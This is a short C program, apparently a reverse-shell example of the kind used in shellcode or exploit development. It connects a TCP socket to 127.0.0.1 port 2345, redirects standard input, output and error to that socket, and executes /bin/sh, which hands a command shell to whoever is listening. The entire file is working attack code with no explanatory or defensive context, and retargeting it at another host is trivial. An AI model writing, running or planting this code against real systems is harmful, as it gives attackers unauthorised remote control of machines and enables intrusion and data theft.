#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
 
int main(void)
{
        int i, server_sockfd;
        socklen_t socklen;
        struct sockaddr_in server_addr;
 
        char *argv[] = { "/bin/sh", NULL};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(2345);
        server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        server_sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
        connect(server_sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
 
        for(i = 0; i <= 2; i++)
                dup2(server_sockfd, i);
 
        execve( "/bin/sh", argv, NULL );
}
